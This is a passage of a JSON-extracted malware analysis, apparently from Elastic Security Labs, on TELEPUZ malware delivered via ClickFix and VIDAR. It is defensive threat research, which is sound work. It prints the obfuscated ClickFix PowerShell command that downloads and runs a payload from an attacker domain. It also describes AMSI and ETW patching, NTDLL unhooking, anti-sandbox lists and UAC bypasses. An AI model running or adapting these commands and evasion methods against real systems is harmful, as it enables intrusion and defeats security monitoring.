@@ -1,0 +1,2779 @@
+{
+ "meta": {
+  "adapter": "generic_html",
+  "extractor": "threat_library_html_v6",
+  "source_url": "https://www.elastic.co/security-labs/threat-command/telepuz-maas-malware-clickfix",
+  "source_host": "www.elastic.co",
+  "content_root": "main",
+  "scope_engine": "section_tree",
+  "scope_engine_version": "tl-scope-engine-section-tree-v2",
+  "section_tree_version": "tl-section-tree-v3",
+  "candidate_extraction_version": "tl-candidates-v30"
+ },
+ "title": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains",
+ "blocks": [
+  {
+   "id": "b001",
+   "page": null,
+   "text": "Threat Command",
+   "type": "paragraph",
+   "section": null
+  },
+  {
+   "id": "b002",
+   "page": null,
+   "text": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains",
+   "type": "heading",
+   "level": 1,
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b003",
+   "page": null,
+   "text": "TELEPUZ is a modular malware that emerged through CLICKFIX-VIDAR attacks in April. We reverse-engineered it to show you the infrastructure and evasion techniques that matter.",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b004",
+   "page": null,
+   "text": "July 16, 2026",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b005",
+   "page": null,
+   "text": "Cyril François",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b006",
+   "page": null,
+   "text": "Malware Analysis",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b007",
+   "page": null,
+   "text": "Jump to",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b008",
+   "page": null,
+   "text": "Share",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b009",
+   "page": null,
+   "text": "Elastic Security Labs is tracking an emerging threat named TELEPUZ, which we have discovered spreading widely via a CLICKFIX-VIDAR chain. This malware is in active development and has been operating since late April 2026, according to the infrastructure information we collected. The malware is full-featured, lightweight, and modular. While the number of C2 domains is currently small, the daily volume of builds uploaded to VirusTotal and the rapid pace of updates indicate active development and likely further growth.",
+   "type": "paragraph",
+   "section": "TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains"
+  },
+  {
+   "id": "b010",
+   "page": null,
+   "text": "Key takeaways",
+   "type": "heading",
+   "level": 3,
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b011",
+   "page": null,
+   "text": "Full-featured malware, modular, fast evolving",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b012",
+   "page": null,
+   "text": "Possible new MaaS, spreading fast",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b013",
+   "page": null,
+   "text": "Currently low number of C2 domains",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b014",
+   "page": null,
+   "text": "Stagers, main payload, and additional modules; uses WebSockets for communication.",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b015",
+   "page": null,
+   "text": "Observed delivered via a CLICKFIX-VIDAR campaign.",
+   "type": "list",
+   "section": "Key takeaways"
+  },
+  {
+   "id": "b016",
+   "page": null,
+   "text": "TELEPUZ infection chain via CLICKFIX-VIDAR",
+   "type": "heading",
+   "level": 2,
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR"
+  },
+  {
+   "id": "b017",
+   "page": null,
+   "text": "TELEPUZ infection chain diagram showing ClickFix, PowerShell, VIDAR, install.exe stager and modular payload delivery",
+   "type": "paragraph",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR"
+  },
+  {
+   "id": "b018",
+   "page": null,
+   "text": "The infection chain begins with a ClickFix social engineering infection, in which the user visits a malicious web page and is prompted to copy and paste, then execute, a Windows shell command to access the page's content.",
+   "type": "paragraph",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR"
+  },
+  {
+   "id": "b019",
+   "page": null,
+   "text": "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -NoP -w h -ep bypass -c \\",
+   "type": "code",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR",
+   "line_group": "b019"
+  },
+  {
+   "id": "b020",
+   "page": null,
+   "text": "\"$h='memsho'+'wblob[.]forum';$n='f322a5fa.exe';$u='https://'+$h+'/api/index.php?a=grab';\\",
+   "type": "code",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR",
+   "line_group": "b019"
+  },
+  {
+   "id": "b021",
+   "page": null,
+   "text": "$f=$env:TEMP+'\\'+$n;[Net.WebClient]::new().('Down'+'loadFile')($u,$f);\\",
+   "type": "code",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR",
+   "line_group": "b019"
+  },
+  {
+   "id": "b022",
+   "page": null,
+   "text": "ri($f+':Zone.Identifier')-EA 0;& $f",
+   "type": "code",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR",
+   "line_group": "b019"
+  },
+  {
+   "id": "b023",
+   "page": null,
+   "text": "The command downloads the second stage from the URL hxxps://memshowblob[.]forum/api/index.php?a=grab and executes the binary in the user's %TEMP% folder.",
+   "type": "paragraph",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR"
+  },
+  {
+   "id": "b024",
+   "page": null,
+   "text": "The second stage is a VIDAR Go variant (580b441e2961739fd26e54e0a0ea08351cb10a51839519fc722cfa39ecd0c954). VIDAR is a well-documented threat known for its ability to download and deploy secondary payloads. In this campaign, we observed it downloading and executing two additional components: the TELEPUZ stager (install.exe) and the main binary (telepuz.dll), both of which were retrieved from the hurgadatour[.]shop domain.",
+   "type": "paragraph",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR"
+  },
+  {
+   "id": "b025",
+   "page": null,
+   "text": "TELEPUZ VirusTotal submissions showing staging domain URLs from hurgadatour.shop with dates and submission counts",
+   "type": "paragraph",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR"
+  },
+  {
+   "id": "b026",
+   "page": null,
+   "text": "The telemetriawork part in the second-stage domain URL is a significant marker for this family; searching for this name on VirusTotal yields a large number of stagers and payloads associated with this family.",
+   "type": "paragraph",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR"
+  },
+  {
+   "id": "b027",
+   "page": null,
+   "text": "VirusTotal search results for telemetriawork pivot showing 429 TELEPUZ file matches with executable hashes",
+   "type": "paragraph",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR"
+  },
+  {
+   "id": "b028",
+   "page": null,
+   "text": "The third stage (03fa348b70819296c958c842e7646b3b7efe5fa217ed5098143003c47995a746) is a small PE, roughly 13–15 KB in size, designed to download and execute the main payload. After downloading the DLL, the stager installs it in the configured install folder and execute it using rundll32 with the specified export name. These stagers share the same obfuscation mechanism as the main payload, which we will analyze in the following chapter, effectively linking them to the same family.",
+   "type": "paragraph",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR"
+  },
+  {
+   "id": "b029",
+   "page": null,
+   "text": "TELEPUZ DownloadRunModule function downloading DLL from zewaplus.club and executing with rundll32.exe",
+   "type": "paragraph",
+   "section": "TELEPUZ infection chain via CLICKFIX-VIDAR"
+  },
+  {
+   "id": "b030",
+   "page": null,
+   "text": "TELEPUZ technical analysis and internals",
+   "type": "heading",
+   "level": 2,
+   "section": "TELEPUZ technical analysis and internals"
+  },
+  {
+   "id": "b031",
+   "page": null,
+   "text": "The reference sample is 58aec6e3835aaf20f7b4a7e308b36a19e7454673a6f71783871e9bcf6cae8eed",
+   "type": "paragraph",
+   "section": "TELEPUZ technical analysis and internals"
+  },
+  {
+   "id": "b032",
+   "page": null,
+   "text": "The main payload is a 64-bit Windows shared library with one or two exports, whose names are systematically chosen to disguise the library as legitimate software. The malware is written in C, likely by hand, lightweight, modular, and the code quality is correct. The malware contains sparse memory allocations, little middleware, and some features still under development. These elements indicate that the project is led either by a solo developer or a very small team, and that coding is their core business. Given the significant number of builds uploaded to VirusTotal daily, it is likely that we are dealing with a MaaS.",
+   "type": "paragraph",
+   "section": "TELEPUZ technical analysis and internals"
+  },
+  {
+   "id": "b033",
+   "page": null,
+   "text": "Our sample contains the following exports:",
+   "type": "paragraph",
+   "section": "TELEPUZ technical analysis and internals"
+  },
+  {
+   "id": "b034",
+   "page": null,
+   "text": "TELEPUZ main payload exports showing GatewayLaunch and ServiceRoutine entry points masquerading as legitimate DLL",
+   "type": "paragraph",
+   "section": "TELEPUZ technical analysis and internals"
+  },
+  {
+   "id": "b035",
+   "page": null,
+   "text": "TELEPUZ obfuscation techniques",
+   "type": "heading",
+   "level": 3,
+   "section": "TELEPUZ obfuscation techniques"
+  },
+  {
+   "id": "b036",
+   "page": null,
+   "text": "Garbage instructions",
+   "type": "heading",
+   "level": 4,
+   "section": "Garbage instructions"
+  },
+  {
+   "id": "b037",
+   "page": null,
+   "text": "The malware interleaves its actual code with “garbage instructions,” which have no functional purpose and are intended to slow down reverse engineering. However, some of these instructions are built to produce side effects, such as updating global variables or invoking Windows APIs, likely to ensure they are not optimized away by either the compiler or the disassembler as dead code. Fortunately, the IDA Pro decompiler does a good job at optimizing them, reducing the amount of clutter and rendering this obfuscation method largely ineffective.",
+   "type": "paragraph",
+   "section": "Garbage instructions"
+  },
+  {
+   "id": "b038",
+   "page": null,
+   "text": "TELEPUZ code showing ROR bit rotation operations, NtCurrentPeb access, and thread magic number calculations",
+   "type": "paragraph",
+   "section": "Garbage instructions"
+  },
+  {
+   "id": "b039",
+   "page": null,
+   "text": "Import hashing",
+   "type": "heading",
+   "level": 4,
+   "section": "Import hashing"
+  },
+  {
+   "id": "b040",
+   "page": null,
+   "text": "TELEPUZ employs standard module and import name hashing to resolve its imports, which are dynamically loaded upon each invocation.",
+   "type": "paragraph",
+   "section": "Import hashing"
+  },
+  {
+   "id": "b041",
+   "page": null,
+   "text": "TELEPUZ GetModuleHandle and GetProcAddress dynamically loading ntdll.dll to extract syscall numbers for indirect syscall engine initialization",
+   "type": "paragraph",
+   "section": "Import hashing"
+  },
+  {
+   "id": "b042",
+   "page": null,
+   "text": "The hashing algorithm is described below:",
+   "type": "paragraph",
+   "section": "Import hashing"
+  },
+  {
+   "id": "b043",
+   "page": null,
+   "text": "def hash_module_name_wide(name):",
+   "type": "code",
+   "section": "Import hashing",
+   "line_group": "b043"
+  },
+  {
+   "id": "b044",
+   "page": null,
+   "text": "h = 0x97C2CA4B",
+   "type": "code",
+   "section": "Import hashing",
+   "line_group": "b043"
+  },
+  {
+   "id": "b045",
+   "page": null,
+   "text": "for c in name:",
+   "type": "code",
+   "section": "Import hashing",
+   "line_group": "b043"
+  },
+  {
+   "id": "b046",
+   "page": null,
+   "text": "b = ord(c) & 0xFF",
+   "type": "code",
+   "section": "Import hashing",
+   "line_group": "b043"
+  },
+  {
+   "id": "b047",
+   "page": null,
+   "text": "if 0x41 <= b <= 0x5A:",
+   "type": "code",
+   "section": "Import hashing",
+   "line_group": "b043"
+  },
+  {
+   "id": "b048",
+   "page": null,
+   "text": "b += 0x20",
+   "type": "code",
+   "section": "Import hashing",
+   "line_group": "b043"
+  },
+  {
+   "id": "b049",
+   "page": null,
+   "text": "h = ((h << 0x15) | (h >> 0x0B)) & 0xFFFFFFFF",
+   "type": "code",
+   "section": "Import hashing",
+   "line_group": "b043"
+  },
+  {
+   "id": "b050",
+   "page": null,
+   "text": "h = (h - b) & 0xFFFFFFFF",
+   "type": "code",
+   "section": "Import hashing",
+   "line_group": "b043"
+  },
+  {
+   "id": "b051",
+   "page": null,
+   "text": "h = (0x48076BB1 * h - 0x4767A3AB) & 0xFFFFFFFF",
+   "type": "code",
+   "section": "Import hashing",
+   "line_group": "b043"
+  },
+  {
+   "id": "b052",
+   "page": null,
+   "text": "return h",
+   "type": "code",
+   "section": "Import hashing",
+   "line_group": "b043"
+  },
+  {
+   "id": "b053",
+   "page": null,
+   "text": "String encryption",
+   "type": "heading",
+   "level": 4,
+   "section": "String encryption"
+  },
+  {
+   "id": "b054",
+   "page": null,
+   "text": "TELEPUZ decrypts strings using a custom RC4 implementation, using constants that vary between samples. We developed an IDA script that uses the debugger's Appcall feature to instrument the decryption function and recover all strings. The IDA script is available here.",
+   "type": "paragraph",
+   "section": "String encryption"
+  },
+  {
+   "id": "b055",
+   "page": null,
+   "text": "Indirect syscalls",
+   "type": "heading",
+   "level": 4,
+   "section": "Indirect syscalls"
+  },
+  {
+   "id": "b056",
+   "page": null,
+   "text": "TELEPUZ employs indirect syscalls for several of its activities. To initialize its indirect syscall engine, the malware maps a fresh copy of ntdll.dll into memory using ReadFile. It then iterates through the export table to identify specific functions, parsing their syscall number from their instructions.",
+   "type": "paragraph",
+   "section": "Indirect syscalls"
+  },
+  {
+   "id": "b057",
+   "page": null,
+   "text": "TELEPUZ disassembly showing syscall instruction and export function matching to syscall numbers",
+   "type": "paragraph",
+   "section": "Indirect syscalls"
+  },
+  {
+   "id": "b058",
+   "page": null,
+   "text": "Once the syscall numbers are collected, TELEPUZ generates “trampoline” stubs consisting of the syscall prelude followed by a jump to the address of a syscall;retn gadget.",
+   "type": "paragraph",
+   "section": "Indirect syscalls"
+  },
+  {
+   "id": "b059",
+   "page": null,
+   "text": "TELEPUZ VirtualAlloc syscall trampoline building code patching system library .text section with indirect syscalls",
+   "type": "paragraph",
+   "section": "Indirect syscalls"
+  },
+  {
+   "id": "b060",
+   "page": null,
+   "text": "Finally, the malware selects a random library from a set of standard libraries (dfscli.dll, davhlpr.dll, msdtclog.dll, dsrole.dll, and secur32.dll) and loads it via LoadLibrary. It then patches the library's .text section with the previously generated trampolines, so indirect syscalls are now executed from this location.",
+   "type": "paragraph",
+   "section": "Indirect syscalls"
+  },
+  {
+   "id": "b061",
+   "page": null,
+   "text": "TELEPUZ indirect syscall trampoline patching loaded library .text section to bypass ETW and API hooking",
+   "type": "paragraph",
+   "section": "Indirect syscalls"
+  },
+  {
+   "id": "b062",
+   "page": null,
+   "text": "TELEPUZ execution flow and persistence installation",
+   "type": "heading",
+   "level": 3,
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b063",
+   "page": null,
+   "text": "The malware's execution begins with its DllMain. The goal of this initial stage is to re-execute the malware using rundll32.exe with the appropriate export name, provided the current process is not already running as svchost.exe or rundll32.exe.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b064",
+   "page": null,
+   "text": "TELEPUZ code checking if current process is rundll32.exe and spawning threads for privilege escalation and C2 communication",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b065",
+   "page": null,
+   "text": "During the second execution, the ServiceRoutine export is triggered. This function serves as the primary malware entry point, responsible for installing persistence, initializing the indirect syscall engine, performing anti-VM and anti-debugger checks, elevating its privileges, installing itself as a service and finally initiating the C2 communication loop.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b066",
+   "page": null,
+   "text": "Upon execution, the malware first verifies if it is running from the %TEMP% folder. If so, it migrates to the designated persistence directory, which is distinct from the installation folder. While the stager typically handles writing the payload to the installation directory, the malware includes a fallback mechanism to copy itself to an %AppData% directory if this step has not yet been performed, re-run it from there and delete the current sample.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b067",
+   "page": null,
+   "text": "TELEPUZ DoPersistence function copying malware to DCFG Runtime Themes Processor folder and executing via rundll32",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b068",
+   "page": null,
+   "text": "Next, the malware creates the mutex cfgmgr_mtx if it does not already exist. It then performs anti-VM and geolocation checks by verifying hardware constraints, such as whether the system has fewer than two CPUs, less than 2GB of memory, or insufficient disk space, and ensuring the system's locale identifier (LCID) is not among a hardcoded list of Commonwealth of Independent States (CIS) countries.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b069",
+   "page": null,
+   "text": "LCID | Language | Country ¶ 0x422 | Ukrainian | Ukraine ¶ 0x423 | Belarusian | Belarus ¶ 0x42B | Armenian | Armenia ¶ 0x42C | Azerbaijani | Azerbaijan ¶ 0x428 | Tajik | Tajikistan ¶ 0x437 | Georgian | Georgia ¶ 0x43F | Kazakh | Kazakhstan ¶ 0x440 | Kyrgyz | Kyrgyzstan ¶ 0x442 | Turkmen | Turkmenistan ¶ 0x443 | Uzbek | Uzbekistan ¶ 0x818 | Romanian | Moldova",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "0x422",
+      "Ukrainian",
+      "Ukraine"
+     ],
+     [
+      "0x423",
+      "Belarusian",
+      "Belarus"
+     ],
+     [
+      "0x42B",
+      "Armenian",
+      "Armenia"
+     ],
+     [
+      "0x42C",
+      "Azerbaijani",
+      "Azerbaijan"
+     ],
+     [
+      "0x428",
+      "Tajik",
+      "Tajikistan"
+     ],
+     [
+      "0x437",
+      "Georgian",
+      "Georgia"
+     ],
+     [
+      "0x43F",
+      "Kazakh",
+      "Kazakhstan"
+     ],
+     [
+      "0x440",
+      "Kyrgyz",
+      "Kyrgyzstan"
+     ],
+     [
+      "0x442",
+      "Turkmen",
+      "Turkmenistan"
+     ],
+     [
+      "0x443",
+      "Uzbek",
+      "Uzbekistan"
+     ],
+     [
+      "0x818",
+      "Romanian",
+      "Moldova"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "LCID",
+     "Language",
+     "Country"
+    ]
+   },
+   "layout": "table",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b070",
+   "page": null,
+   "text": "The malware subsequently compares the current username and computer name against a hardcoded list of common sandbox and malware research identifiers.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b071",
+   "page": null,
+   "text": "TELEPUZ sandbox detection code comparing username against hardcoded malware research identifiers using CustomRC4 decryption",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b072",
+   "page": null,
+   "text": "Usernames",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b072"
+  },
+  {
+   "id": "b073",
+   "page": null,
+   "text": "sandbox, malware, virus, test, sample, cuckoo, bruno, jz, dekker, abby, wilbert, johnson, miller, harddisk, currentuser, john, tim, sand box, maltest, pjones, fred",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b072"
+  },
+  {
+   "id": "b074",
+   "page": null,
+   "text": "Computer names",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b074"
+  },
+  {
+   "id": "b075",
+   "page": null,
+   "text": "sandbox, virus, malware, tequilaboomboom, hal9th, john-pc, mueller-pc, hanspeter-pc, 7silvia, fortinet, wasp, mars, desk-ivruuh4y14, COMPUTERNAME",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b074"
+  },
+  {
+   "id": "b076",
+   "page": null,
+   "text": "Finally, the malware compares the display device name against a list of known hypervisor identifiers.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b077",
+   "page": null,
+   "text": "TELEPUZ VM detection code checking display device name, CPU count and memory constraints using CustomRC4 decryption",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b078",
+   "page": null,
+   "text": "If the malware identifies a virtualized environment or an unauthorized geographic location, it terminates execution immediately. Otherwise, it proceeds to initialize the indirect syscall engine and executes a series of evasion routines: NTDLL unhooking, AMSI and ETW patching, and the removal of DllNotification callbacks, to disable security monitoring.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b079",
+   "page": null,
+   "text": "TELEPUZ indirect syscall engine setup code initializing trampolines and patching freshly loaded DLL for syscall evasion",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b080",
+   "page": null,
+   "text": "To unhook NTDLL, TELEPUZ maps a fresh copy of the library using NtMapViewOfSection. It then compares the loaded exports against this clean copy, restoring any patched bytes. For AMSI evasion, it patches the AmsiScanBuffer function with ”mov eax, 0x80070057; retn, forcing the function to return E_INVALIDARG to the caller. Finally, to disable ETW, it patches EtwEventWrite, NtTraceEvent, and NtTraceEventControl with ”xor eax, eax; retn instructions, effectively forcing these functions to return zero.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b081",
+   "page": null,
+   "text": "To remove third party DllNotification callbacks, the malware registers a dummy function via LdrRegisterDllNotification to obtain a cookie. It then uses the resulting opaque structure to iterate through the linked list of registered callbacks, verifying whether each resides within a legitimate Windows library. If not it removes it.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b082",
+   "page": null,
+   "text": "TELEPUZ DllNotification callback removal code iterating linked list to unregister third-party security tool callbacks",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b083",
+   "page": null,
+   "text": "Following the evasion routines, the malware initiates debugger detection. It utilizes NtQueryInformationProcess to inspect ProcessDebugPort, ProcessDebugFlags, and ProcessDebugObjectHandle. It then employs NtGetContextThread to verify if hardware breakpoints (DR0–DR7) are enabled. To further thwart analysis, it calls NtSetInformationThread with the ThreadHideFromDebugger flag and NtClose with 0xDEADBEEF to cause a debugger crash.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b084",
+   "page": null,
+   "text": "TELEPUZ ThreadHideFromDebugger anti-debugging technique triggering exception to detect debugger presence",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b085",
+   "page": null,
+   "text": "Finally, the malware retrieves the parent process ID and verifies the parent process name against a list of known runners, such as rundll32.exe and svchost.exe.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b086",
+   "page": null,
+   "text": "TELEPUZ parent process verification against known runner processes using CustomRC4 string decryption",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b087",
+   "page": null,
+   "text": "The detection sequence concludes by inspecting the PEB.BeingDebugged flag. If a debugger is identified, the malware calls the Sleep function with an INFINITE parameter.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b088",
+   "page": null,
+   "text": "Once the debugger detection sequence completes, the malware generates a unique session id/victim identifier. This identifier is derived by combining the hardware serial number, the computer name, and the operating system's installation date. The generation algorithm is detailed below.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b089",
+   "page": null,
+   "text": "FNV1_SEED = 0x811C9DC5",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b090",
+   "page": null,
+   "text": "FNV1_PRIME = 0x01000193",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b091",
+   "page": null,
+   "text": "ROR27_SEED = 0xA1B39854",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b092",
+   "page": null,
+   "text": "GOLDEN_RATIO = 0x61C88647",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b093",
+   "page": null,
+   "text": "def fnv1_32(data: bytes, h: int = FNV1_SEED) -> int:",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b094",
+   "page": null,
+   "text": "for b in data:",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b095",
+   "page": null,
+   "text": "h = (FNV1_PRIME * (h ^ b)) & 0xFFFFFFFF",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b096",
+   "page": null,
+   "text": "return h",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b097",
+   "page": null,
+   "text": "def ror27_sub(data: bytes, h: int = ROR27_SEED) -> int:",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b098",
+   "page": null,
+   "text": "for b in data:",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b099",
+   "page": null,
+   "text": "v = (b ^ h) & 0xFFFFFFFF",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b100",
+   "page": null,
+   "text": "h = (((v >> 0x1B) | (v << 0x05)) - GOLDEN_RATIO) & 0xFFFFFFFF",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b101",
+   "page": null,
+   "text": "return h",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b102",
+   "page": null,
+   "text": "def generate_session_id(computer_name: bytes, volume_serial: bytes, install_date: bytes) -> str:",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b103",
+   "page": null,
+   "text": "data = computer_name + volume_serial + install_date",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b104",
+   "page": null,
+   "text": "return \"%08x%08x\" % (fnv1_32(data), ror27_sub(data))",
+   "type": "code",
+   "section": "TELEPUZ execution flow and persistence installation",
+   "line_group": "b089"
+  },
+  {
+   "id": "b105",
+   "page": null,
+   "text": "Following successful session identification, the malware spawns two concurrent threads: one dedicated to elevate itself and install the malware as a service, and the other to initiate the C2 communication loop. The installation thread starts by elevating itself as Admin using the COM elevation moniker technique. This technique involves creating an elevated COM object and using its ShellExecute method to spawn another elevated instance of the sample, thereby successfully bypassing UAC. A full implementation of this technique is available here.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b106",
+   "page": null,
+   "text": "TELEPUZ COM elevation moniker technique using CLSID_CMSTPLUA for UAC bypass with CustomRC4 decryption",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b107",
+   "page": null,
+   "text": "We identified an alternative UAC bypass using AppInfo ALPC and DebugObjects. The malware first launches a non-elevated winver.exe in debug mode via RAicLaunchAdminProcess to capture its debug object handle. It then launches an auto-elevated computerdefault.exe in debug mode and attaches the captured handle using DbgUiSetThreadDebugObject. This grants the malware full access to the elevated process, allowing it to spawn rundll32.exe and execute itself with elevated privileges. A full implementation of this technique is available here.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b108",
+   "page": null,
+   "text": "TELEPUZ debugger detection checking ProcessDebugPort, ProcessDebugFlags and ThreadHideFromDebugger",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b109",
+   "page": null,
+   "text": "Upon achieving elevation and depending on the configuration TELEPUZ next tries to get SYSTEM privilege by stealing the token of the first found process with one of the following names: spoolsv.exe, msdtc.exe, WmiPrvSE.exe, svchost.exe. Next it registers itself as a service by creating the necessary registry keys to instruct Windows to load the malware within a new svchost.exe instance. The malware again tries to masquerade as legitimate software with the service name CipherAllocator.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b110",
+   "page": null,
+   "text": "TELEPUZ CipherAllocator service registration in Windows registry with ServiceDll and ServiceMain parameters",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b111",
+   "page": null,
+   "text": "Windows Registry Editor showing TELEPUZ CipherAllocator service registration with KngWrk and LocalService entries",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b112",
+   "page": null,
+   "text": "The second thread manages the C2 communication loop, handling command reception, execution, and data exfiltration. Communication protocols and command structures are detailed in the following sections.",
+   "type": "paragraph",
+   "section": "TELEPUZ execution flow and persistence installation"
+  },
+  {
+   "id": "b113",
+   "page": null,
+   "text": "TELEPUZ C2 communication",
+   "type": "heading",
+   "level": 3,
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b114",
+   "page": null,
+   "text": "TELEPUZ's configuration contains a single C2 domain, which is initialized just before the generation of the session identifier.",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b115",
+   "page": null,
+   "text": "TELEPUZ C2 domain initialization and session ID generation combining hardware serial, computer name and install date via FNV1",
+   "type": "paragraph",
+   "section": "TELEPUZ C2 communication"
+  },
+  {
+   "id": "b116",
+   "page": null,
